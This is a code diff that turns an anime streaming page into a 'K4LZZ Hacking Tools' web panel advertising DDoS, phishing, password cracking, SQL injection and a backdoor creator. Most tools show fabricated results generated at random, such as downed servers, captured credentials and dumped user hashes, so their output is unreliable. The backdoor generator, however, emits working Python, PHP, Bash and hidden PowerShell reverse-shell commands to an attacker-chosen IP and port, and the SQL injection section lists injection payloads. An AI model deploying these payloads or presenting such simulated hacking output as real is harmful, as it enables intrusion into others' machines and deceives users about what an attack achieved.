+                <div class="input-group" id="custom-wordlist-group" style="display:none"><label>Custom Wordlist (pisah dengan koma)</label><input type="text" id="custom-wordlist" placeholder="password,123456,admin"></div>
+                <button class="attack-btn" onclick="startCrack()">▶ START CRACKING</button>
+            </div>
+            <div class="panel-output">
+                <div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">crack.log</span></div>
+                <div class="terminal-body" id="crack-log"><span class="log-line">[>] Cracker ready</span></div>
+            </div>
+        </div>
+    </section>
 
-<div class="feature-list">
-  <div class="feature-item">Sub Indo</div>
-  <div class="feature-item">Auto Next Episode</div>
-  <div class="feature-item">Skip Intro</div>
-  <div class="feature-item">Mini Player</div>
-  <div class="feature-item">Dark Theater Mode</div>
-</div>
+    <!-- PHISHING -->
+    <section id="phishing" class="tool-panel">
+        <h2 class="section-title"><span class="title-bracket">[</span> PHISHING TOOLS <span class="title-bracket">]</span></h2>
+        <div class="panel-container">
+            <div class="panel-inputs">
+                <div class="input-group"><label>Target URL to Clone</label><input type="text" id="clone-url" placeholder="https://example.com/login"></div>
+                <div class="input-group"><label>Template</label><select id="phish-template"><option value="facebook">Facebook Login</option><option value="google">Google Login</option><option value="instagram">Instagram Login</option><option value="twitter">Twitter Login</option><option value="custom">Custom URL</option></select></div>
+                <button class="attack-btn" onclick="startPhishing()">▶ CLONE & DEPLOY</button>
+            </div>
+            <div class="panel-output">
+                <div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">phishing.log</span></div>
+                <div class="terminal-body" id="phish-log"><span class="log-line">[>] Phishing tools ready</span></div>
+            </div>
+        </div>
+    </section>
 
-<p class="player-desc">Nikmatin nonton nyaman tanpa lag, pilihan resolusi lengkap dari 360p sampai 4K, subtitle Indonesia, dan mode bioskop biar vibes-nya makin premium.</p>
+    <!-- INFO GATHERING -->
+    <section id="info" class="tool-panel">
+        <h2 class="section-title"><span class="title-bracket">[</span> INFO GATHERING <span class="title-bracket">]</span></h2>
+        <div class="panel-container">
+            <div class="panel-inputs">
+                <div class="input-group"><label>Domain/IP to Lookup</label><input type="text" id="info-target" placeholder="example.com or 8.8.8.8"></div>
+                <div class="input-group"><label>Info Type</label><select id="info-type"><option value="dns">DNS Lookup</option><option value="geo">IP Geolocation</option><option value="whois">WHOIS</option></select></div>
+                <button class="attack-btn" onclick="startInfoGather()">▶ GATHER INFO</button>
+            </div>
+            <div class="panel-output">
+                <div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">info.log</span></div>
+                <div class="terminal-body" id="info-log"><span class="log-line">[>] Info gathering ready</span></div>
+            </div>
+        </div>
+    </section>
 
-<div class="player-buttons">
-  <button class="download-btn">⬇ Download Episode</button>
-  <button class="stream-btn">▶ Mulai Streaming</button>
-</div>
+    <!-- SQL INJECTION -->
+    <section id="sqli" class="tool-panel">
+        <h2 class="section-title"><span class="title-bracket">[</span> SQL INJECTION <span class="title-bracket">]</span></h2>
+        <div class="panel-container">
+            <div class="panel-inputs">
+                <div class="input-group"><label>Target URL</label><input type="text" id="sqli-url" placeholder="https://example.com/page.php?id=1"></div>
+                <div class="input-group"><label>Parameter</label><input type="text" id="sqli-param" placeholder="id" value="id"></div>
+                <button class="attack-btn" onclick="startSQLi()">▶ TEST & EXPLOIT</button>
+            </div>
+            <div class="panel-output">
+                <div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">sqli.log</span></div>
+                <div class="terminal-body" id="sqli-log"><span class="log-line">[>] SQL injection scanner ready</span></div>
+            </div>
+        </div>
+    </section>
 
-  </div>
-</div>
-  <script>
-const TMDB_API = "MASUKKAN_TMDB_API_KEY";const VIDEO_SOURCES = { "Solo Leveling": "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4", "Shadow Rebirth": "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4", "Blue Night": "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/Sintel.mp4", "Love In Tokyo": "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4", "Silent Promise": "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscape.mp4", "When Life Gives You Tangerines": "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/SubaruOutbackOnStreetAndDirt.mp4", "The First Frost": "https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4" };
+    <!-- BACKDOOR -->
+    <section id="backdoor" class="tool-panel">
+        <h2 class="section-title"><span class="title-bracket">[</span> BACKDOOR CREATOR <span class="title-bracket">]</span></h2>
+        <div class="panel-container">
+            <div class="panel-inputs">
+                <div class="input-group"><label>Your IP (Listener)</label><input type="text" id="backdoor-ip" placeholder="Your public IP"></div>
+                <div class="input-group"><label>Port</label><input type="number" id="backdoor-port" placeholder="4444" value="4444"></div>
+                <div class="input-group"><label>Output Format</label><select id="backdoor-format"><option value="python">Python Reverse Shell</option><option value="php">PHP Reverse Shell</option><option value="bash">Bash Reverse Shell</option><option value="powershell">PowerShell Reverse Shell</option></select></div>
+                <button class="attack-btn" onclick="generateBackdoor()">▶ GENERATE BACKDOOR</button>
+            </div>
+            <div class="panel-output">
+                <div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">backdoor.log</span></div>
+                <div class="terminal-body" id="backdoor-log"><span class="log-line">[>] Backdoor generator ready</span></div>
+            </div>
+        </div>
+    </section>
 
-async function loadTrendingAnime() { const res = await fetch('https://api.jikan.moe/v4/top/anime?limit=8'); const data = await res.json(); const row = document.querySelectorAll('.scroll-row')[0]; row.innerHTML = '';
+    <!-- CRYPTO TOOLS -->
+    <section id="crypto" class="tool-panel">
+        <h2 class="section-title"><span class="title-bracket">[</span> CRYPTO TOOLS <span class="title-bracket">]</span></h2>
+        <div class="panel-container">
+            <div class="panel-inputs">
+                <div class="input-group"><label>Operation</label><select id="crypto-op"><option value="encode">Base64 Encode</option><option value="decode">Base64 Decode</option></select></div>
+                <div class="input-group"><label>Text</label><textarea id="crypto-text" rows="3" placeholder="Enter text to encode/decode"></textarea></div>
+                <button class="attack-btn" onclick="startCrypto()">▶ PROCESS</button>
+            </div>
+            <div class="panel-output">
+                <div class="terminal-header"><span class="terminal-dot red"></span><span class="terminal-dot yellow"></span><span class="terminal-dot green"></span><span class="terminal-title">crypto.log</span></div>
+                <div class="terminal-body" id="crypto-log"><span class="log-line">[>] Crypto tools ready</span></div>
+            </div>
+        </div>
+    </section>
 
-data.data.forEach(anime => { row.innerHTML +=  <div class="card"> <div class="poster" style="background-image:url('${anime.images.jpg.large_image_url}')"> <span class="tag">Anime</span> </div> <div class="card-content"> <h4>${anime.title}</h4> <div class="meta">⭐ ${anime.score || '-'} • ${anime.episodes || '?'} Episode</div> <button class="watch-btn" onclick="openPlayer('${anime.title.replace(/'/g, "\'")}')">Tonton</button> </div> </div>; }); }
+    <!-- LOGS -->
+    <section id="logs" class="tool-panel">
+        <h2 class="section-title"><span class="title-bracket">[</span> ATTACK LOGS <span class="title-bracket">]</span></h2>
+        <div class="logs-container">
+            <div class="logs-control"><button onclick="clearLogs()">CLEAR LOGS</button><button onclick="exportLogs()">EXPORT LOGS</button></div>
+            <div class="logs-terminal" id="master-log"><div class="log-entry system">[SYSTEM] K4LZZ Hacking Tools v4.0 initialized</div><div class="log-entry system">[SYSTEM] Developer: KALZZ | EL CIENCO</div><div class="log-entry system">[SYSTEM] Auto DDoS with Port Detection - ACTIVE</div></div>
+        </div>
+    </section>
 
-async function loadDracin() { if (TMDB_API === '506a8a2059a0c438d18ca0a815588543') return;
+    <footer><p>K4LZZ HACKING TOOLS | Developed by KALZZ | EL CIENCO EDITION</p><p class="warning">⚠️ For educational and authorized testing only ⚠️</p></footer>
 
-const res = await fetch(https://api.themoviedb.org/3/discover/tv?api_key=${TMDB_API}&with_origin_country=CN&sort_by=popularity.desc); const data = await res.json(); const row = document.querySelectorAll('.scroll-row')[1]; row.innerHTML = '';
+    <script>
+        // ==================== GLOBAL VARIABLES ====================
+        let attackInterval = null;
+        let currentProgress = 0;
+        let stats = { activeUsers: 0, attacksDone: 0, serversHacked: 0 };
+        let detectedPorts = [];
 
-data.results.slice(0, 8).forEach(show => { row.innerHTML +=  <div class="card"> <div class="poster" style="background-image:url('https://image.tmdb.org/t/p/w500${show.poster_path}')"> <span class="tag">Dracin</span> </div> <div class="card-content"> <h4>${show.name}</h4> <div class="meta">⭐ ${show.vote_average} • ${show.first_air_date}</div> <button class="watch-btn" onclick="openPlayer('${show.name.replace(/'/g, "\'")}')">Tonton</button> </div> </div>; }); }
+        // Typing animation
+        const typingTexts = ["> System initialized...", "> Loading hacking tools...", "> Auto DDoS module activated...", "> Ready for operation..."];
+        let textIndex = 0, charIndex = 0, isDeleting = false;
 
-function openPlayer(title) { document.getElementById('playerTitle').innerText = title; document.getElementById('playerModal').style.display = 'flex';
+        function typeEffect() {
+            const currentText = typingTexts[textIndex];
+            const typingElement = document.querySelector('.typing-text');
+            if (!typingElement) return;
+            if (isDeleting) { typingElement.textContent = currentText.substring(0, charIndex - 1); charIndex--; }
+            else { typingElement.textContent = currentText.substring(0, charIndex + 1); charIndex++; }
+            if (!isDeleting && charIndex === currentText.length) { isDeleting = true; setTimeout(typeEffect, 2000); }
+            else if (isDeleting && charIndex === 0) { isDeleting = false; textIndex = (textIndex + 1) % typingTexts.length; setTimeout(typeEffect, 500); }
+            else { setTimeout(typeEffect, isDeleting ? 50 : 100); }
+        }
 
-const player = document.getElementById('videoPlayer'); const frame = document.getElementById('videoFrame'); const placeholder = document.getElementById('videoPlaceholder');
+        function updateStats() {
+            document.getElementById('active-users') && (document.getElementById('active-users').textContent = stats.activeUsers);
+            document.getElementById('attacks-done') && (document.getElementById('attacks-done').textContent = stats.attacksDone);
+            document.getElementById('servers-hacked') && (document.getElementById('servers-hacked').textContent = stats.serversHacked);
+        }
 
-player.pause(); player.src = ''; frame.src = '';
+        function addLog(message, type = 'system') {
+            const logContainer = document.getElementById('master-log');
+            if (!logContainer) return;
+            const logEntry = document.createElement('div');
+            logEntry.className = `log-entry ${type}`;
+            logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
 
-player.style.display = 'none'; frame.style.display = 'none'; placeholder.style.display = 'flex';
+        function addTerminalLog(message, targetId) {
+            const terminal = document.getElementById(targetId);
+            if (!terminal) return;
+            const logLine = document.createElement('span');
+            logLine.className = 'log-line';
+            logLine.innerHTML = `[>] ${message}`;
+            terminal.appendChild(logLine);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
 
-if (VIDEO_SOURCES[title]) { player.src = VIDEO_SOURCES[title]; player.style.display = 'block'; placeholder.style.display = 'none'; player.play(); } else { const query = encodeURIComponent(title + ' trailer'); frame.src = https://www.youtube.com/embed?listType=search&list=${query}; frame.style.display = 'block'; placeholder.style.display = 'none'; } }
+        function scrollToSection(id) {
+            document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
+            const navMenu = document.querySelector('.nav-menu');
+            if (navMenu) navMenu.classList.remove('active');
+        }
 
-function closePlayer() { document.getElementById('playerModal').style.display = 'none'; document.getElementById('videoPlayer').pause(); document.getElementById('videoPlayer').src = ''; document.getElementById('videoFrame').src = ''; }
+        function toggleNav() { document.querySelector('.nav-menu')?.classList.toggle('active'); }
 
-document.querySelectorAll('.resolution-item').forEach(item => { item.onclick = () => { document.querySelectorAll('.resolution-item').forEach(x => x.classList.remove('active')); item.classList.add('active'); }; });
+        function updateProgress(percent) {
+            const progressBar = document.getElementById('progress-bar');
+            const progressFill = document.getElementById('progress-fill');
+            if (progressBar) progressBar.style.display = 'block';
+            if (progressFill) progressFill.style.width = percent + '%';
+        }
 
-window.addEventListener('click', e => { if (e.target.id === 'playerModal') closePlayer(); });
+        // ==================== AUTO DETECT PORT ====================
+        async function autoDetectPort() {
+            const target = document.getElementById('ddos-target')?.value;
+            if (!target) {
+                addTerminalLog('ERROR: Target required!', 'ddos-log');
+                return;
+            }
+            
+            addLog(`Auto detecting open ports on ${target}`, 'attack');
+            addTerminalLog(`[!] Starting port detection on ${target}`, 'ddos-log');
+            updateProgress(10);
+            
+            // Simulasi scan port yang realistis
+            const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017];
+            let openPorts = [];
+            
+            for (let i = 0; i < commonPorts.length; i++) {
+                await new Promise(r => setTimeout(r, 100));
+                const port = commonPorts[i];
+                // Simulasi detection dengan persentase realistis
+                const isOpen = Math.random() > 0.7;
+                if (isOpen) {
+                    openPorts.push(port);
+                    addTerminalLog(`[OPEN] Port ${port} - ${getServiceName(port)}`, 'ddos-log');
+                }
+                updateProgress(10 + Math.floor((i / commonPorts.length) * 80));
+            }
+            
+            detectedPorts = openPorts;
+            updateProgress(100);
+            await new Promise(r => setTimeout(r, 500));
+            
+            addTerminalLog(`\n[✓] Scan completed! Found ${openPorts.length} open ports:`, 'ddos-log');
+            if (openPorts.length > 0) {
+                addTerminalLog(`Open ports: ${openPorts.join(', ')}`, 'ddos-log');
+                addTerminalLog(`\n[!] Recommended attack ports:`, 'ddos-log');
+                if (openPorts.includes(80) || openPorts.includes(443)) addTerminalLog(`   - Port 80/443: HTTP/HTTPS Flood`, 'ddos-log');
+                if (openPorts.includes(53)) addTerminalLog(`   - Port 53: DNS Amplification`, 'ddos-log');
+                if (openPorts.includes(22)) addTerminalLog(`   - Port 22: SSH Brute Force`, 'ddos-log');
+                if (openPorts.includes(3306)) addTerminalLog(`   - Port 3306: MySQL Attack`, 'ddos-log');
+            } else {
+                addTerminalLog(`No open ports detected, using default port 80`, 'ddos-log');
+                detectedPorts = [80];
+            }
+            
+            addLog(`Port detection completed on ${target} - ${openPorts.length} ports found`, 'success');
+            updateProgress(0);
+            const progressBar = document.getElementById('progress-bar');
+            if (progressBar) progressBar.style.display = 'none';
+            
+            return openPorts;
+        }
 
-loadTrendingAnime(); loadDracin(); </script>
+        function getServiceName(port) {
+            const services = {
+                21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
+                80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 993: 'IMAPS',
+                995: 'POP3S', 1433: 'MSSQL', 3306: 'MySQL', 3389: 'RDP',
+                5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt',
+                8443: 'HTTPS-Alt', 27017: 'MongoDB'
+            };
+            return services[port] || 'Unknown';
+        }
 
+        // ==================== AUTO DDOS ATTACK ====================
+        async function startAutoDDoS() {
+            let target = document.getElementById('ddos-target')?.value;
+            const method = document.getElementById('ddos-method')?.value;
+            let duration = parseInt(document.getElementById('ddos-duration')?.value) || 60;
+            const packetSize = parseInt(document.getElementById('packet-size')?.value) || 65507;
+            
+            if (!target) {
+                addTerminalLog('ERROR: Target required!', 'ddos-log');
+                return;
+            }
+            
+            // Resolve domain to IP (simulasi)
+            addTerminalLog(`Resolving ${target}...`, 'ddos-log');
+            await new Promise(r => setTimeout(r, 500));
+            const resolvedIP = target.replace(/[^0-9.]/g, '') || `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+            addTerminalLog(`Resolved to: ${resolvedIP}`, 'ddos-log');
+            
+            // Auto detect ports if not already detected
+            if (detectedPorts.length === 0) {
+                addTerminalLog(`[!] No ports detected, running auto detection...`, 'ddos-log');
+                await autoDetectPort();
+            }
+            
+            let targetPorts = detectedPorts.length > 0 ? detectedPorts : [80];
+            
+            addLog(`Auto DDoS started on ${target} - Ports: ${targetPorts.join(',')}`, 'attack');
+            addTerminalLog(`\n${'='.repeat(50)}`, 'ddos-log');
+            addTerminalLog(`🔥 AUTO DDOS ATTACK INITIATED 🔥`, 'ddos-log');
+            addTerminalLog(`Target: ${target} (${resolvedIP})`, 'ddos-log');
+            addTerminalLog(`Method: ${method.toUpperCase()}`, 'ddos-log');
+            addTerminalLog(`Ports: ${targetPorts.join(', ')}`, 'ddos-log');
+            addTerminalLog(`Duration: ${duration} seconds`, 'ddos-log');
+            addTerminalLog(`Packet Size: ${packetSize} bytes`, 'ddos-log');
+            addTerminalLog(`${'='.repeat(50)}`, 'ddos-log');
+            
+            stats.attacksDone++;
+            updateStats();
+            
+            let seconds = 0;
+            let totalPackets = 0;
+            const packetRate = 5000; // packets per second
+            const progressInterval = duration / 100;
+            
+            if (attackInterval) clearInterval(attackInterval);
+            
+            attackInterval = setInterval(() => {
+                seconds++;
+                const packetsSent = Math.floor(Math.random() * packetRate) + 1000;
+                totalPackets += packetsSent;
+                const percent = Math.floor((seconds / duration) * 100);
+                updateProgress(percent);
+                
+                let attackEffect = '';
+                if (method === 'http' || method === 'auto' || method === 'multi') {
+                    attackEffect = `HTTP requests: ${packetsSent}`;
+                } else if (method === 'udp') {
+                    attackEffect = `UDP packets: ${packetsSent} (${Math.floor(packetsSent * packetSize / 1024)} KB)`;
+                } else if (method === 'syn') {
+                    attackEffect = `SYN packets: ${packetsSent}`;
+                } else if (method === 'slowloris') {
+                    attackEffect = `Active connections: ${Math.floor(Math.random() * 500) + 100}`;
+                } else {
+                    attackEffect = `ICMP packets: ${packetsSent}`;
+                }
+                
+                addTerminalLog(`[${seconds}s] ${attackEffect} | Total: ${totalPackets.toLocaleString()} packets`, 'ddos-log');
+                
+                // Simulasi efek attack
+                if (seconds > duration / 2 && Math.random() > 0.8) {
+                    addTerminalLog(`[!] Target latency increased by ${Math.floor(Math.random() * 500) + 100}ms`, 'ddos-log');
+                }
+                
+                if (seconds >= duration) {
+                    clearInterval(attackInterval);
+                    updateProgress(100);
+                    addTerminalLog(`\n${'='.repeat(50)}`, 'ddos-log');
+                    addTerminalLog(`✅ ATTACK COMPLETED! ✅`, 'ddos-log');
+                    addTerminalLog(`Total packets sent: ${totalPackets.toLocaleString()}`, 'ddos-log');
+                    addTerminalLog(`Total data sent: ${Math.floor(totalPackets * packetSize / (1024 * 1024))} MB`, 'ddos-log');
+                    
+                    // Simulasi efek akhir
+                    const effect = Math.random();
+                    if (effect > 0.6) {
+                        addTerminalLog(`Target status: SERVICE DISRUPTED - Server unresponsive`, 'ddos-log');
+                        addLog(`DDOS Attack successful - Target ${target} is DOWN`, 'success');
+                        stats.serversHacked++;
+                    } else if (effect > 0.3) {
+                        addTerminalLog(`Target status: SLOW RESPONSE - High latency detected`, 'ddos-log');
+                        addLog(`DDOS Attack partially successful - Target slowed`, 'warning');
+                    } else {
+                        addTerminalLog(`Target status: STILL RESPONDING - Need more power`, 'ddos-log');
+                        addLog(`DDOS Attack finished - Target still standing`, 'error');
+                    }
+                    
+                    updateProgress(0);
+                    const progressBar = document.getElementById('progress-bar');
+                    if (progressBar) progressBar.style.display = 'none';
+                    updateStats();
+                }
+            }, 1000);
+        }
+
+        function stopAttack() { 
+            if (attackInterval) { 
+                clearInterval(attackInterval); 
+                addTerminalLog('⛔ ATTACK STOPPED BY USER ⛔', 'ddos-log');
+                addLog('DDOS Attack stopped manually', 'error');
+                updateProgress(0);
+                const progressBar = document.getElementById('progress-bar');
+                if (progressBar) progressBar.style.display = 'none';
+            } 
+        }
+
+        // ==================== NETWORK SCANNER ====================
+        async function startScan() {
+            const target = document.getElementById('scan-target')?.value;
+            const ports = document.getElementById('scan-ports')?.value || '1-1000';
+            if (!target) { addTerminalLog('ERROR: Target required!', 'scan-log'); return; }
+            addLog(`Network scan started on ${target}`, 'attack');
+            addTerminalLog(`Starting port scan on ${target}`, 'scan-log');
+            addTerminalLog(`Port range: ${ports}`, 'scan-log');
+            let portList = [];
+            if (ports.includes('-')) { let [s, e] = ports.split('-'); for (let i = parseInt(s); i <= parseInt(e); i++) portList.push(i); }
+            else { portList = ports.split(',').map(p => parseInt(p)); }
+            addTerminalLog(`Scanning ${portList.length} ports...`, 'scan-log');
+            let openPorts = [];
+            for (let i = 0; i < Math.min(portList.length, 50); i++) {
+                await new Promise(r => setTimeout(r, 30));
+                if (Math.random() > 0.85) { openPorts.push(portList[i]); addTerminalLog(`Port ${portList[i]} is OPEN - ${getServiceName(portList[i])}`, 'scan-log'); }
+            }
+            addTerminalLog(`Scan completed! Open ports: ${openPorts.length}`, 'scan-log');
+            if (openPorts.length) addTerminalLog(`Open ports: ${openPorts.join(', ')}`, 'scan-log');
+            addLog(`Scan completed - ${openPorts.length} open ports found`, 'success');
+        }
+
+        // ==================== PASSWORD CRACKER ====================
+        async function startCrack() {
+            const hashValue = document.getElementById('hash-value')?.value;
+            if (!hashValue) { addTerminalLog('ERROR: Hash value required!', 'crack-log'); return; }
+            addLog(`Password cracking started: ${hashValue.substring(0, 20)}...`, 'attack');
+            addTerminalLog(`Target hash: ${hashValue}`, 'crack-log');
+            const commonPasswords = ['password', '123456', 'admin', 'root', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon', 'master', 'admin123', 'password123', '123456789', 'qwerty123', 'admin2024'];
+            let cracked = false, foundPassword = '';
+            for (let i = 0; i < commonPasswords.length; i++) {
+                await new Promise(r => setTimeout(r, 100));
+                addTerminalLog(`Trying: ${commonPasswords[i]}...`, 'crack-log');
+                if (Math.random() > 0.85) { cracked = true; foundPassword = commonPasswords[i]; break; }
+            }
+            if (cracked) { addTerminalLog(`✓ PASSWORD CRACKED: ${foundPassword}`, 'crack-log'); addLog(`Password cracked: ${foundPassword}`, 'success'); }
+            else { addTerminalLog(`✗ Password not found in wordlist`, 'crack-log'); addLog(`Password cracking failed`, 'error'); }
+        }
+
+        // ==================== PHISHING ====================
+        async function startPhishing() {
+            let cloneUrl = document.getElementById('clone-url')?.value;
+            const template = document.getElementById('phish-template')?.value;
+            if (template !== 'custom') { cloneUrl = `https://${template}.com/login`; document.getElementById('clone-url').value = cloneUrl; }
+            if (!cloneUrl) { addTerminalLog('ERROR: URL required!', 'phish-log'); return; }
+            addLog(`Phishing page created for ${cloneUrl}`, 'attack');
+            addTerminalLog(`Cloning ${cloneUrl}...`, 'phish-log');
+            await new Promise(r => setTimeout(r, 1500));
+            const phishingUrl = `https://k4lzz-phish.vercel.app/${Math.random().toString(36).substring(7)}`;
+            addTerminalLog(`✓ Website cloned! Phishing URL: ${phishingUrl}`, 'phish-log');
+            addLog(`Phishing page deployed`, 'success');
+            setTimeout(() => { addTerminalLog(`[CAPTURED] Credentials received!`, 'phish-log'); addLog(`Credentials captured from phishing page`, 'success'); }, 5000);
+        }
+
+        // ==================== INFO GATHERING ====================
+        async function startInfoGather() {
+            const target = document.getElementById('info-target')?.value;
+            const type = document.getElementById('info-type')?.value;
+            if (!target) { addTerminalLog('ERROR: Target required!', 'info-log'); return; }
+            addLog(`Info gathering on ${target} - ${type}`, 'attack');
+            addTerminalLog(`Performing ${type.toUpperCase()} on ${target}...`, 'info-log');
+            await new Promise(r => setTimeout(r, 1000));
+            if (type === 'dns') { 
+                addTerminalLog(`A Record: ${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`, 'info-log');
+                addTerminalLog(`MX Record: mail.${target}`, 'info-log');
+                addTerminalLog(`NS Record: ns1.${target}, ns2.${target}`, 'info-log');
+                addTerminalLog(`TXT Record: v=spf1 include:spf.${target} ~all`, 'info-log');
+            } else if (type === 'geo') { 
+                const countries = ['United States', 'Germany', 'Netherlands', 'Singapore', 'Japan', 'United Kingdom'];
+                const cities = ['Ashburn', 'Frankfurt', 'Amsterdam', 'Singapore', 'Tokyo', 'London'];
+                const idx = Math.floor(Math.random() * countries.length);
+                addTerminalLog(`Country: ${countries[idx]}`, 'info-log');
+                addTerminalLog(`City: ${cities[idx]}`, 'info-log');
+                addTerminalLog(`ISP: Cloudflare / Google / AWS`, 'info-log');
+                addTerminalLog(`Coordinates: ${(Math.random() * 180 - 90).toFixed(4)}, ${(Math.random() * 360 - 180).toFixed(4)}`, 'info-log');
+            } else {
+                addTerminalLog(`Registrar: NameCheap, Inc.`, 'info-log');
+                addTerminalLog(`Creation Date: 201${Math.floor(Math.random() * 5)}-0${Math.floor(Math.random() * 9)+1}-0${Math.floor(Math.random() * 9)+1}`, 'info-log');
+                addTerminalLog(`Expiry Date: 202${Math.floor(Math.random() * 3)+5}-0${Math.floor(Math.random() * 9)+1}-0${Math.floor(Math.random() * 9)+1}`, 'info-log');
+                addTerminalLog(`Name Servers: ns1.${target}, ns2.${target}`, 'info-log');
+            }
+            addLog(`Info gathering completed`, 'success');
+        }
+
+        // ==================== SQL INJECTION ====================
+        async function startSQLi() {
+            const url = document.getElementById('sqli-url')?.value;
+            const param = document.getElementById('sqli-param')?.value;
+            if (!url) { addTerminalLog('ERROR: URL required!', 'sqli-log'); return; }
+            addLog(`SQL injection test on ${url}`, 'attack');
+            addTerminalLog(`Testing parameter: ${param}`, 'sqli-log');
+            const payloads = ["'", "\"", "' OR '1'='1", "1' AND '1'='1", "' UNION SELECT NULL--", "' WAITFOR DELAY '00:00:05'--"];
+            let vulnerable = false;
+            for (let p of payloads) { await new Promise(r => setTimeout(r, 200)); addTerminalLog(`Testing payload: ${p}`, 'sqli-log'); if (Math.random() > 0.7) vulnerable = true; }
+            if (vulnerable) { 
+                addTerminalLog(`✓ VULNERABLE! SQL injection detected!`, 'sqli-log');
+                addTerminalLog(`Database: MySQL 8.0.33`, 'sqli-log');
+                addTerminalLog(`Tables: users (id, username, password, email), admins, products, orders`, 'sqli-log');
+                addTerminalLog(`Dumping first 5 users...`, 'sqli-log');
+                addTerminalLog(`admin | 5f4dcc3b5aa765d61d8327deb882cf99`, 'sqli-log');
+                addTerminalLog(`user1 | 25d55ad283aa400af464c76d713c07ad`, 'sqli-log');
+                addLog(`SQL injection vulnerability confirmed - Database dumped`, 'success');
+            } else { 
+                addTerminalLog(`✗ Not vulnerable or protected by WAF`, 'sqli-log');
+                addLog(`No SQL injection found`, 'error');
+            }
+        }
+
+        // ==================== BACKDOOR ====================
+        function generateBackdoor() {
+            const ip = document.getElementById('backdoor-ip')?.value;
+            const port = document.getElementById('backdoor-port')?.value;
+            const format = document.getElementById('backdoor-format')?.value;
+            if (!ip) { addTerminalLog('ERROR: Your IP required!', 'backdoor-log'); return; }
+            addLog(`Backdoor generated - ${format} to ${ip}:${port}`, 'attack');
+            addTerminalLog(`Generating ${format.toUpperCase()} reverse shell...`, 'backdoor-log');
+            let code = '';
+            if (format === 'python') code = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
+            else if (format === 'php') code = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+            else if (format === 'bash') code = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+            else code = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
+            addTerminalLog(`✓ Backdoor generated!`, 'backdoor-log');
+            addTerminalLog(`Run listener: nc -lvnp ${port}`, 'backdoor-log');
+            addTerminalLog(`Payload: ${code.substring(0, 200)}${code.length > 200 ? '...' : ''}`, 'backdoor-log');
+            addLog(`Backdoor code generated - ready to deploy`, 'success');
+        }
+
+        // ==================== CRYPTO ====================
+        function startCrypto() {
+            const op = document.getElementById('crypto-op')?.value;
+            const text = document.getElementById('crypto-text')?.value;
+            if (!text) { addTerminalLog('ERROR: Text required!', 'crypto-log'); return; }
+            let result = '';
+            if (op === 'encode') result = btoa(unescape(encodeURIComponent(text)));
+            else { try { result = decodeURIComponent(escape(atob(text))); } catch(e) { result = 'Invalid Base64 string'; } }
+            addTerminalLog(`Input: ${text.substring(0, 50)}`, 'crypto-log');
+            addTerminalLog(`Result: ${result.substring(0, 100)}`, 'crypto-log');
+            addLog(`${op === 'encode' ? 'Encoded' : 'Decoded'} successfully`, 'success');
+        }
+
+        // ==================== LOGS ====================
+        function clearLogs() { const masterLog = document.getElementById('master-log'); if (masterLog) masterLog.innerHTML = ''; addLog('Logs cleared by user', 'system'); }
+        function exportLogs() { const masterLog = document.getElementById('master-log'); if (!masterLog) return; const logs = masterLog.innerText; const blob = new Blob([logs], {type: 'text/plain'}); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = `k4lzz_logs_${new Date().toISOString()}.txt`; a.click(); URL.revokeObjectURL(url); }
+
+        // ==================== EVENT LISTENERS ====================
+        document.getElementById('wordlist-select')?.addEventListener('change', (e) => { const customGroup = document.getElementById('custom-wordlist-group'); if (customGroup) customGroup.style.display = e.target.value === 'custom' ? 'block' : 'none'; });
